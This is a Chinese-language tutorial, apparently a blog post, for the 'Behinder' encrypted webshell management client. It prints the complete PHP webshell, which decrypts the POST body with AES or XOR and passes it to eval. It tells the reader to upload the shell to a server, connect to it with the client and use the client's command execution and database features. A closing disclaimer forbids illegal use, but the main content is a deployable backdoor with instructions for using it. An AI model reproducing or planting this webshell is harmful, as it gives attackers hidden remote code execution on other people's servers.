## 一. 概述

“冰蝎”动态二进制加密网站管理客户端

## 二. 运行环境

    
    
    客户端：jre6~jre8
    服务端：.net 2.0+;php 5.4-7.2;java 6+

## 三. 使用手册

1\. 上传小马

使用冰蝎自带小马,上传至服务器端

    
    
    <?php
    @error_reporting(0);
    session_start();
    if (isset($_GET['pass']))
    {
        $key=substr(md5(uniqid(rand())),16);
        $_SESSION['k']=$key;
        print $key;
    }
    else
    {
        $key=$_SESSION['k'];
    	$post=file_get_contents("php://input");
    	if(!extension_loaded('openssl'))
    	{
    		$t="base64_"."decode";
    		$post=$t($post."");
    		
    		for($i=0;$i<strlen($post);$i++) {
        			 $post[$i] = $post[$i]^$key[$i+1&15]; 
        			}
    	}
    	else
    	{
    		$post=openssl_decrypt($post, "AES128", $key);
    	}
        $arr=explode('|',$post);
        $func=$arr[0];
        $params=$arr[1];
    	class C{public function __construct($p) {eval($p."");}}
    	@new C($params);
    }
    ?>
    

  
![](https://image.3001.net/images/20200907/1599491628.png!small)

### 2\. 配置冰蝎连接

在面板空白处右键点击新增,配置小马的URL和密码,选择类型,点击保存

![watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1NjQ1NzUz,size_16,color_FFFFFF,t_70#pic_center](https://image.3001.net/images/20200907/1599491641.png!small)添加成功  
![watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1NjQ1NzUz,size_16,color_FFFFFF,t_70#pic_center](https://image.3001.net/images/20200907/1599491676.png!small)

## 三. 功能介绍

 **1、基本命令**

![watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1NjQ1NzUz,size_16,color_FFFFFF,t_70#pic_center](https://image.3001.net/images/20200907/1599491687.png!small)

  
 **2、命令执行**  
**![watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1NjQ1NzUz,size_16,color_FFFFFF,t_70#pic_center](https://image.3001.net/images/20200907/1599491710.png!small)3、数据库管理**  
**![watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1NjQ1NzUz,size_16,color_FFFFFF,t_70#pic_center](https://image.3001.net/images/20200907/1599491721.png!small)免责声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。**

